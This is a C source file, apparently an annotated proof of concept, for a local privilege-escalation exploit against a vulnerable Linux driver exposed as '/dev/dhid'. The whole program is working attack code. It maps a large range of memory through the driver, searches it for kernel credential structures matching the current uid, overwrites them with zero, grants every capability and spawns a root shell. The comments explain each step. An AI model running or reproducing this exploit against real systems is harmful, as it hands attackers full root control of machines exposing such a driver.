#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>

int main(int argc, char * const * argv) 
{ 
/* This portion is to load the vulnerable driver */
	printf("[+] PID: %d\n",getpid());
	int fd = open("/dev/dhid", O_RDWR); 
	if (fd < 0) 
	{ 
		printf("[-] Open failed!\n"); 
		return -1; 
	} 
	printf("[+] Open OK fd: %d\n",fd);
/* This next portion is to mark how large the address we want to use the mmap function to map */
/* 0xf0000000 is effectively 4GB */
/* We could have expanded this to larger mem size but this is not necessary */
	unsigned long size = 0xf0000000;
/* This is the starting point of the memory to map from */
	unsigned long mmapStart = 0x42424000;
/* Mapping */
	unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); 
	printf("addr: %lx\n",addr);
	if (addr == MAP_FAILED) 
	{ 
		perror("Failed to mmap: "); 
		close(fd); 
		return -1; 
	} 
	printf("[+] mmap OK addr: %lx\n", addr); 
/* This next portion is to get our uid which is supposed to be 1000 */
	unsigned int uid = getuid();
	printf("[+] UID: %d\n",uid);
	unsigned int credIt = 0;
	unsigned int credNum = 0;
/* This next line means that we are going to repeat this search for the specific memory addresses until we exhaust our specified size which is 4GB */
	while(((unsigned long)addr) < (mmapStart + size -0x40))
	{
		credIt = 0;
		if(
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid 
				)
/* The CredNum is the counter for the possible addresses found within this 4GB memory range */
		{
			credNum ++;
			printf("[+] Found cred structure! ptr : %p, credNum: %d\n",addr,credNum);
		
			credIt = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
/* Supposed if our getuid function found a uid = 0, notify us */
/* To make sure that we break the check, the CredIt is replaced with 0xfffffffff 
 * which effectively makes the equation > our specified memoery range, so the system will stop scanning 
 */
			if(getuid() == 0)
			{
				puts("[+] GOT ROOT!");
				credIt += 1; //Skip 4 bytes, to get capabilities 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
				addr[credIt++] = 0xffffffff; 
/* Since we have found the uid = 0, we use the uid = 0 to execute a shell */
				execl("/bin/sh", "-", (char *)NULL); 
				puts("[-] Execl failed...");
				break;
			}
			else
			{
				credIt = 0;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
			}
		}
		addr ++;
	}
	printf("test addr: %p\n",addr);
	puts("[+] Scanning loop END");
	fflush(stdout);
	close(fd); 
	getchar();
	return 0; 
}

